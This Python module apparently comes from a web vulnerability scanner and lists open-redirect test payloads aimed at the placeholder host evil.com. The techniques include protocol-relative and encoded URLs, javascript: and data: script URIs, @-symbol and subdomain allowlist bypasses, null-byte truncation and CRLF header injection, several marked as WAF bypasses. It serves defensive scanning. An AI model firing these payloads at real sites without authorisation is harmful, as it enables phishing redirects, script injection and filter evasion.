"""
Open Redirect Payloads

Collection of payloads for detecting unvalidated redirect vulnerabilities.
"""

from dataclasses import dataclass
from typing import List


@dataclass
class RedirectPayload:
    """Open redirect payload."""
    payload: str
    technique: str
    description: str
    waf_bypass: bool
    risk_indicator: str
    encoding: str  # none|url|double_url|unicode


def get_redirect_payloads() -> List[RedirectPayload]:
    """Get all open redirect payloads."""

    payloads = []

    # ==== BASIC REDIRECTS ====

    # Simple HTTP URL
    payloads.append(RedirectPayload(
        payload="http://evil.com",
        technique="absolute_url",
        description="Basic absolute URL redirect",
        waf_bypass=False,
        risk_indicator="Location:.*evil\\.com",
        encoding="none"
    ))

    # HTTPS URL
    payloads.append(RedirectPayload(
        payload="https://evil.com",
        technique="absolute_url",
        description="HTTPS absolute URL",
        waf_bypass=False,
        risk_indicator="Location:.*evil\\.com",
        encoding="none"
    ))

    # ==== PROTOCOL-RELATIVE URLS ====

    # Protocol-relative URL
    payloads.append(RedirectPayload(
        payload="//evil.com",
        technique="protocol_relative",
        description="Protocol-relative URL",
        waf_bypass=True,
        risk_indicator="Location:.*//evil\\.com",
        encoding="none"
    ))

    # Triple slash
    payloads.append(RedirectPayload(
        payload="///evil.com",
        technique="protocol_relative",
        description="Triple slash bypass",
        waf_bypass=True,
        risk_indicator="Location:.*///evil\\.com",
        encoding="none"
    ))

    # ==== JAVASCRIPT PROTOCOL ====

    # javascript: protocol
    payloads.append(RedirectPayload(
        payload="javascript:alert(1)",
        technique="javascript_protocol",
        description="JavaScript protocol handler",
        waf_bypass=False,
        risk_indicator="javascript:",
        encoding="none"
    ))

    # ==== DATA PROTOCOL ====

    # data: protocol
    payloads.append(RedirectPayload(
        payload="data:text/html,<script>alert(1)</script>",
        technique="data_protocol",
        description="Data URI protocol",
        waf_bypass=False,
        risk_indicator="data:text/html",
        encoding="none"
    ))

    # ==== BACKSLASH BYPASSES ====

    # Backslash instead of forward slash
    payloads.append(RedirectPayload(
        payload="http:\\\\evil.com",
        technique="backslash_bypass",
        description="Backslash URL bypass",
        waf_bypass=True,
        risk_indicator="evil\\.com",
        encoding="none"
    ))

    # Mixed slashes
    payloads.append(RedirectPayload(
        payload="http:/\\/evil.com",
        technique="mixed_slash",
        description="Mixed slash bypass",
        waf_bypass=True,
        risk_indicator="evil\\.com",
        encoding="none"
    ))

    # ==== ENCODING BYPASSES ====

    # URL-encoded redirect
    payloads.append(RedirectPayload(
        payload="http%3A%2F%2Fevil.com",
        technique="url_encoded",
        description="URL-encoded redirect",
        waf_bypass=True,
        risk_indicator="evil\\.com",
        encoding="url"
    ))

    # Double URL-encoded
    payloads.append(RedirectPayload(
        payload="http%253A%252F%252Fevil.com",
        technique="double_encoded",
        description="Double URL-encoded redirect",
        waf_bypass=True,
        risk_indicator="evil\\.com",
        encoding="double_url"
    ))

    # ==== WHITELIST BYPASSES ====

    # Subdomain bypass
    payloads.append(RedirectPayload(
        payload="http://target.com.evil.com",
        technique="subdomain_bypass",
        description="Trusted domain as subdomain",
        waf_bypass=True,
        risk_indicator="evil\\.com",
        encoding="none"
    ))

    # @ symbol bypass
    payloads.append(RedirectPayload(
        payload="http://target.com@evil.com",
        technique="at_symbol_bypass",
        description="Username@ bypass",
        waf_bypass=True,
        risk_indicator="evil\\.com",
        encoding="none"
    ))

    # ==== PARAMETER POLLUTION ====

    # Multiple redirect params
    payloads.append(RedirectPayload(
        payload="?redirect=http://target.com&redirect=http://evil.com",
        technique="param_pollution",
        description="Parameter pollution bypass",
        waf_bypass=True,
        risk_indicator="evil\\.com",
        encoding="none"
    ))

    # ==== NULL BYTE INJECTION ====

    # Null byte bypass
    payloads.append(RedirectPayload(
        payload="http://evil.com%00.target.com",
        technique="null_byte",
        description="Null byte truncation",
        waf_bypass=True,
        risk_indicator="evil\\.com",
        encoding="none"
    ))

    # ==== CRLF INJECTION ====

    # CRLF in redirect
    payloads.append(RedirectPayload(
        payload="http://target.com%0d%0aLocation:%20http://evil.com",
        technique="crlf_injection",
        description="CRLF header injection",
        waf_bypass=True,
        risk_indicator="Location:.*evil\\.com",
        encoding="url"
    ))

    return payloads


def get_waf_bypass_payloads() -> List[RedirectPayload]:
    """Get WAF bypass payloads."""
    all_payloads = get_redirect_payloads()
    return [p for p in all_payloads if p.waf_bypass]


def get_protocol_payloads() -> List[RedirectPayload]:
    """Get javascript: and data: protocol payloads."""
    all_payloads = get_redirect_payloads()
    return [p for p in all_payloads if 'protocol' in p.technique]


def get_encoding_payloads() -> List[RedirectPayload]:
    """Get encoding bypass payloads."""
    all_payloads = get_redirect_payloads()
    return [p for p in all_payloads if p.encoding != 'none']
